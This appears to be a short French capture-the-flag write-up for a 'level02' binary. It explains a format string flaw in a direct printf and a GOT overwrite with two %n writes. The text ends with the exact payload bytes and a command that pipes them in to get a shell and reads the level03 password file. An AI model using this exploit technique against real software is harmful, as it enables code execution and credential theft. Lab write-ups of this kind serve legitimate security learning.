L'executable va lire le mot de passe de level03 et le stoquer en memoire (et
quitter en cas d'echec a la lecture), puis lire sur l'entree standard un
'Username', puis un 'Password' et comparer ce dernier au MDP de level03. Si
egalite, l'executable va ouvrir un shell. Sinon, il printf le buffer contenant
la 1ere lecture de l'entree standard directement, puis puts une chaine de
caracteres avant d'exit.

La faille de securite est bien evidemment le printf direct qui permet une format
string attack. Il est possible d'afficher directement le mot de passe qui est
commodement place en memoire, mais pourquoi faire simple quand on peux faire
complique ?

On as donc choisi de faire une attaque sur la GOT. Etant sur un executable 64
bits, et n'ayant pas acces a gdb (qui drop les droits et empeche l'executable de
lire le MDP), c'est difficile. L'argument %n de printf n'ecrivant que 4 octets a
la fois, il faut 2 appels pour ecrire l'addresse entiere de 8 octets.

Ayant acces a 2 buffers, on utilise le 2eme buffer (celui du 'Password') pour
stoquer l'addresse de la GOT, car elle contiens des 0 qui sinon termineraient la
chaine de caracteres de printf. On va donc mettre 2 %n dans le 1er buffer, un
pour mettre a 0 les 4 permiers octets de l'addresse GOT, et le 2eme pour mettre
les 4 derniers a l'addresse dans le main qui ouvre un shell, avec le printf
'greetings' pour se prendre dans le sens du poil.

Notre chaine d'attaque seras donc:
%8$n[4196972 octets de padding]%9$n\n[addresse de la GOT + 4][addresse de la GOT]\n

	$ echo -en "%8\$n%4196972d%9\$n\n\xe4\x11\x60\x00\x00\x00\x00\x00\xe0\x11\x60\x00\x00\x00\x00\x00\n" > /tmp/in
	$ (cat /tmp/in; echo "cat /home/users/level03/.pass") | ./level02
